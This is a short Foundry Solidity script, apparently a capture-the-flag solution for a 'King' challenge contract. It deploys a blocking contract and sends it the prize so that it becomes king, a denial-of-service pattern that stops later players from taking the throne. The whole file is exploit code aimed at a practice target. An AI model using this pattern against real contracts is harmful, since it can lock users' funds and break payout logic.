// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script, console} from "forge-std/Script.sol";
import {King, BlockContract} from "../../src/King.sol";

contract AddBalanceForce is Script {
    BlockContract blockContract;

    function blockKingContract(address payable kingContract) public {
        uint256 prize = King(kingContract).prize();
        vm.startBroadcast();
        blockContract = new BlockContract();
        blockContract.beKing{value: prize}(King(kingContract));
        vm.stopBroadcast();
    }

    function run(address payable kingContract) external {
        blockKingContract(kingContract);
    }
}
